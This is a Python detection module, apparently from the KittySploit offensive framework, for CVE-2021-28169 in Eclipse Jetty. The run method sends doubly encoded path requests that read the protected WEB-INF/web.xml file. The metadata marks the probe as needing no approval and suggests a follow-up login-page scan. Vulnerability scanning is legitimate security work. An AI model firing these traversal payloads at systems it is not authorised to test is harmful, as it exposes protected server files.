#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Eclipse Jetty through 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Eclipse Jetty ConcatServlet - Information Disclosure Detection',
        'description': 'Eclipse Jetty through 9.4.40, through 10.0.2, and through 11.0.2 is susceptible to information disclosure. Requests to the ConcatServlet with a doubly encoded path can access protected resources within the WEB-INF directory, thus enabling an attacker to potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'jetty', 'eclipse', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://twitter.com/sec715/status/1406787963569065988',
            'https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq',
            'https://lists.apache.org/thread.html/r2721aba31a8562639c4b937150897e24f78f747cdbda8641c0f659fe@%3Cusers.kafka.apache.org%3E',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-28169',
            'https://lists.apache.org/thread.html/r04a4b4553a23aff26f42635a6ae388c3b162aab30a88d12e59d05168@%3Cjira.kafka.apache.org%3E',
        ],
        'cve': 'CVE-2021-28169',
    }

    def run(self):
        for path in ('/static?/%2557EB-INF/web.xml', '/concat?/%2557EB-INF/web.xml'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('</web-app>', 'java.sun.com',)
            header_any = ('application/xml',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Eclipse Jetty ConcatServlet - Information Disclosure detected",
                    path=path,
                )
                return True
        return False

